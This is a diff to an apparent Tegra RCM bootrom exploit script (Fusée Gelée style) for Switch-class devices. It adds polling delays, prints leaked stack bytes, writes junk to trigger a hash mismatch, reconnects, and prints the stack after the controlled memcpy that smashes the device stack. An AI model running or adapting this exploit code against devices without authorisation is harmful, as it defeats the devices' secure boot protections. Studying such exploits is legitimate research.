@@ -33,6 +33,7 @@ import errno
 import ctypes
 import argparse
 import platform
+import time
 import binascii
 
 USB_XFER_MAX = 0x1000
@@ -488,6 +489,7 @@ class RCMHax:
                 print("Waiting for a TegraRCM device to come online...")
                 while self.dev is None:
                     self.dev = self._find_device(vid, pid)
+                    time.sleep(0.1)
 
             # ... or bail out.
             else:
@@ -626,8 +628,10 @@ except IOError as e:
     print(e)
     sys.exit(-1)
 
+# switch.backend.dev.reset()
+
 stack = switch.backend.trigger_vulnerability(128)
-print(binascii.hexlify(stack))
+print("stack: {}".format(binascii.hexlify(stack)))
 
 # Print the device's ID. Note that reading the device's ID is necessary to get it into
 try:
@@ -707,10 +711,33 @@ switch.write(payload)
 # about to DMA into the higher one, so we have less to copy during our attack.
 switch.switch_to_highbuf()
 
+
+remaining_junk = b'\0' * (length - len(payload))
+
+# write the rest of the payload to trigger a hash mismatch
+switch.write(remaining_junk)
+
+# try a read to get an error message
+after_rcm_read = switch.read(128)
+print(after_rcm_read)
+print(binascii.hexlify(after_rcm_read))
+
+switch = None
+
+input("wait:")
+
+try:
+    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid, 
+            pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
+except IOError as e:
+    print(e)
+    sys.exit(-1)
+
 # Smash the device's stack, triggering the vulnerability.
 print("Smashing the stack...")
 try:
-    switch.trigger_controlled_memcpy()
+    stack = switch.trigger_controlled_memcpy()
+    print("stack: {}".format(binascii.hexlify(stack)))
 except ValueError as e:
     print(str(e))
 except IOError:
